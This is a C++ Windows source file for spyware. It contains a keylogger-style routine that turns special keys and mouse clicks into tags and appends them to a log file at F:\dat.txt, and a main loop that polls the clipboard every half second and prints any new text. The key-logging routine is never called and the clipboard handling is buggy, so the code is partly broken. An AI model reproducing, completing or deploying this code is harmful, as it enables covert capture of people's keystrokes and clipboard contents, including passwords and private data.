#include <iostream>
#include <fstream>
#include <algorithm>
#include <Windows.h>

void LOG(std::string input) {
	std::fstream LogFile;
	LogFile.open("F:\\dat.txt", std::fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		std::cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		std::cout << "\n";
		LOG("\n");
		return true;
	case '¾':
		std::cout << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
		std::cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		std::cout << "\b";
		LOG("\b");
		return true;
	case VK_RBUTTON:
		std::cout << "#R_CLICK#";
		LOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		std::cout << "#CAPS_LOCK#";
		LOG("#CAPS_LCOK");
		return true;
	case VK_TAB:
		std::cout << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP:
		std::cout << "#UP";
		LOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		std::cout << "#DOWN";
		LOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		std::cout << "#LEFT";
		LOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		std::cout << "#RIGHT";
		LOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		std::cout << "#CONTROL";
		LOG("#CONTROL");
		return true;
	case VK_MENU:
		std::cout << "#ALT";
		LOG("#ALT");
		return true;
	default:
		return false;
	}
}

int main() {
	std::string ClipboardText[2];
	char last[2] = { 0, 0 };

	for (;;) {
		Sleep(500);
		OpenClipboard(0);
		HANDLE hData = GetClipboardData(CF_TEXT);
		ClipboardText[1] = static_cast<char*>(GlobalLock(hData));
		//GlobalUnlock(hData);
		if (ClipboardText[0] != ClipboardText[1]) {
			ClipboardText[0] = ClipboardText[1];
			std::cout << ClipboardText[1] << std::endl;
		}
		CloseClipboard();
	}
	return 0;
}
